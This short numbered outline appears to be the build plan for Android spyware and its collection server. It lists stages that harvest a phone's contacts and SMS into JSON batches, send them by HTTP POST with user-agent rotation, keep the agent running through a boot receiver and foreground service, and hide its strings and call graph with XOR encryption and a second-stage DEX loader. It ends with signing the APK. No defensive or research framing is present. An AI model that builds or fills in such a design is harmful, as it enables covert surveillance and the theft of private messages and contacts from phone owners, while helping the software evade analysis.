Pipeline (one line per stage):

1. `Channel.send_frame(url, json)` — chunked HTTP POST transport, retries, UA rotation
2. `grab_contacts(cr)` / `grab_sms(cr)` — ContentResolver collection into JSON batches
3. `install_autostart()` — BOOT_COMPLETED receiver + foreground service keeps agent alive
4. `Str.d(blob)` + `StageLoader` — XOR string decryption and second-stage DEX load so the APK ships no readable strings or static call graph
5. `Server.recv_frame(stream) -> (meta, body)` — Python collector writing per-device JSON
6. `gradle assembleRelease` + `apksigner sign` — build and sign the APK

